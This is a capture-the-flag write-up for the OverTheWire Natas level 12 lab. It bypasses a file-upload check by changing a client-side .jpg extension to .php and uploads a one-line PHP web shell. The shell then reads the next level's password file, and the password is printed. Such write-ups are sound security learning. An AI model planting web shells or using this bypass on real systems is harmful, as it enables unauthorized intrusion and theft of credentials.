@@ -1,0 +1,30 @@
+a.	In this I got a file upload function, after reviewing the source code. The conditions in the source code:
+i.	File size should be less then or equal to 1 KB. 
+b.	Testing further, I try to upload an empty PHP file to see the flow.
+c.	The flow was 
+i.	Challenge auto randomizes the file name with the extension to .jpg 
+d.	After more inspection there is a line in the source code;
+  
+	The random file name and .jpg allocation from the clint side.
+e.	Now, create a web shell less the 1 KB and upload it. 
+f.	As I know the application is based on PHP so I use PHP web shell. 
+
+		<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+g.	Before upload that file, I changed .jpg to .php from the inspect element. 
+
+ 
+
+h.	After uploading the shell got executed and the result was like.
+ 
+
+i.	As in the web shell code e is the variable, so I try to do ls, then the URL became. 
+http://natas12.natas.labs.overthewire.org/upload/dkrgv53guj.php?e=ls
+
+Output:
+
+ 
+
+j.	According to the previous levels, I know that the password file for natas 13 was saved in /etc/natas_webpass/natas13
+k.	Then the URL became:
+http://natas12.natas.labs.overthewire.org/upload/dkrgv53guj.php?e=cat%20/etc/natas_webpass/natas13
+l.	And DONE, FLAG was trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
